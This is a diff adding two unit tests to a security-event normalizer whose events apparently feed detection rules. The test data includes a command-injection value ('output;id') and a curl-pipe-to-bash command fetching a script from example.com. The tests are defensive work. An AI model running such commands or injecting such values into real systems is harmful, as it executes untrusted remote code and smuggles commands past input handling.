@@ -131,3 +131,31 @@ def test_normalizer_to_metadata_strips_none() -> None:
     assert "status" not in md
     assert md["event_type"] == "http.request"
     assert md["src_ip"] is None
+
+
+def test_nft_call_event_round_trip() -> None:
+    """nft.call events are valid metadata for the T1485.001 rule."""
+    ev = ZaqorinEvent.from_log_record(
+        {
+            "event_type": "nft.call",
+            "target_table": "input",
+            "target_chain": "output;id",
+        }
+    )
+    md = ev.to_metadata()
+    assert md["event_type"] == "nft.call"
+    assert md["target_table"] == "input"
+    assert md["target_chain"] == "output;id"
+
+
+def test_process_exec_event_round_trip() -> None:
+    """process.exec events carry the full cmdline for T1059.004."""
+    ev = ZaqorinEvent.from_log_record(
+        {
+            "event_type": "process.exec",
+            "cmdline": "curl -fsSL https://example.com/install.sh | bash",
+        }
+    )
+    md = ev.to_metadata()
+    assert md["event_type"] == "process.exec"
+    assert "| bash" in md["cmdline"]
